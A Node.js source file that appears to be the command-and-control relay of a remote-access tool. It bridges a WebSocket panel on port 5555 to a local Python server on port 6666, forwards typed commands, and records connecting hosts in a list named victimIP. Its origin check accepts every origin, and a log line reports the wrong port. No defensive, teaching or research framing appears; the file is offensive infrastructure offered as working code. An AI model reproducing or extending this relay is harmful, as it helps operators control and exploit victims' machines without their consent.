var WebSocketServer = require('websocket').server;
var net = require('net')
var http = require('http');
var client = new net.Socket();
var victimIP = [];

var server = http.createServer(function (request, response) {
    console.log((new Date()) + ' Received request for ' + request.url);
    response.writeHead(404);
    response.end();
});


server.listen(5555, '0.0.0.0', function () {
    console.log((new Date()) + ' Server is listening on port ' + 7777);
});


async function createConnection() {
    await client.connect(6666, '127.0.0.1', function () {
        console.log("Connected to the python sever")

    })
}

createConnection()

client.on('close', function () {
    console.log("TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT")
})

client.on('error', function (ex) {
    console.log("error")
    console.log(ex)
    createConnection()
})


wsServer = new WebSocketServer({
    httpServer: server,
    // You should not use autoAcceptConnections for production
    // applications, as it defeats all standard cross-origin protection
    // facilities built into the protocol and the browser.  You should
    // *always* verify the connection's origin and decide whether or not
    // to accept it.
    autoAcceptConnections: false
});

function originIsAllowed(origin) {
    // put logic here to detect whether the specified origin is allowed.
    return true;
}

wsServer.on('request', function (request) {
    if (!originIsAllowed(request.origin)) {
        // Make sure we only accept requests from an allowed origin
        request.reject();
        console.log((new Date()) + ' Connection from origin ' + request.origin + ' rejected.');
        return;
    }
    var connection = request.accept('websocket', request.origin);

    if (victimIP.length !== 0)
        connection.send(JSON.stringify(victimIP))
    client.on('data', function (data) {
        if (data.toString().startsWith('Connected$')) {
            connection.send(data.toString())
            if (!victimIP.includes(data.toString())) {
                console.log(victimIP)
                victimIP.push(data.toString())
            }
        } else {
            connection.send(data.toString())
        }
    })
    console.log((new Date()) + ' Connection accepted.');
    connection.on('message', function (message) {
        console.log('Received Message: ' + message.utf8Data);
        client.write(message.utf8Data)

    });

    connection.on('close', function (reasonCode, description) {
        console.log((new Date()) + ' Peer ' + connection.remoteAddress + ' disconnected.');
    });


});